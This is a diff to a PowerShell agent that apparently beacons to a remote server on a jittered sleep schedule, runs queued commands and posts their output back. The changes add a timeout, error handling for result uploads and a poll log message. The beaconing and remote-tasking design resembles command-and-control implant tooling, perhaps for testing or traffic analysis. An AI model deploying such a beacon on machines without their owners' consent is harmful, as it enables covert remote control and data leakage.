@@ -403,6 +403,7 @@ function Invoke-RmmRestMethod {
     $req.Host = $resolved.OriginalHost
     $req.AllowAutoRedirect = $true
     $req.Timeout = 300000
+    $req.ReadWriteTimeout = 120000
     # Default: HTTP keep-alive off so each request tends to close the TCP flow after the exchange (Wireshark-friendly).
     # Persistent mode: keep-alive on so one TCP can carry multiple requests.
     $req.KeepAlive = [bool]$script:UsePersistentHttp
@@ -822,7 +823,13 @@ function Send-RmmTextResult {
     $uri = "$u/result?id=$sessionId"
     $payload = [ordered]@{ rmm_cmd = $CommandLine; rmm_output = $Text }
     $json = $payload | ConvertTo-Json -Compress -Depth 10
-    Invoke-RmmRestMethod -Uri $uri -Method Post -Body $json -ContentType 'application/json; charset=utf-8' -Headers $Headers -RestErrorAction SilentlyContinue
+    try {
+        Invoke-RmmRestMethod -Uri $uri -Method Post -Body $json -ContentType 'application/json; charset=utf-8' -Headers $Headers -RestErrorAction Stop | Out-Null
+        return $true
+    } catch {
+        Write-RmmHttpFailure -ErrorRecord $_ -Context 'POST /result'
+        return $false
+    }
 }
 
 function Send-RmmFileDownload {
@@ -1807,6 +1814,7 @@ while ($true) {
         [RmmHostAnchor]::Restore()
         $null = Get-JitteredSleep -baseSeconds $script:baseSleepSeconds -jitterPercent $script:jitterPercent
 
+        Write-Host "[*] Beacon poll..." -ForegroundColor DarkGray
         $headers = Get-RmmRequestHeaders
         $headers["X-Request-ID"] = [System.Guid]::NewGuid().ToString()
         
@@ -2036,8 +2044,9 @@ while ($true) {
                 }
                 
                 # Send result back to RMM (JSON includes command line so queued runs are labeled on the server)
-                Send-RmmTextResult -CommandLine $command -Text $result -Headers $headers
-                Write-Host "[+] Result sent to RMM" -ForegroundColor Green
+                if (Send-RmmTextResult -CommandLine $command -Text $result -Headers $headers) {
+                    Write-Host "[+] Result sent to RMM" -ForegroundColor Green
+                }
             }
         }
 
